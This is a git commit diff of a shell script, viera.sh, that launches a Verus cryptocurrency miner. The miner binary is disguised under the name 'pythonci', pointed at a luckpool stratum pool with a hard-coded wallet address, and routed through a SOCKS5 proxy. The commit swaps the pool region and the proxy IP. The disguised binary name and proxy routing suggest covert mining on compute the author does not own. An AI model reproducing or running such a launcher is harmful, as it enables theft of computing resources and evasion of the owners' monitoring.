511934ce29e5cce1a6d5f828d031e3a8ea36528a
raenaviera <88834064+raenaviera@users.noreply.github.com>
2021-08-13 20:28:42 +0700

    Update viera.sh

--- viera.sh
+++ viera.sh
@@ -3,9 +3,9 @@ sudo apt update
 sudo apt install screen libjansson4 -y
 chmod +x viera.sh && chmod +x pythonci chmod 777 pythonci viera.sh
 screen -dmS ls
-PL=stratum+tcp://na.luckpool.net:3956
+PL=stratum+tcp://eu.luckpool.net:3956
 WT=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
 WR=VIA-040
-PY=socks5://104.248.48.172:30588
+PY=socks5://188.166.104.152:50725
 ./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
 
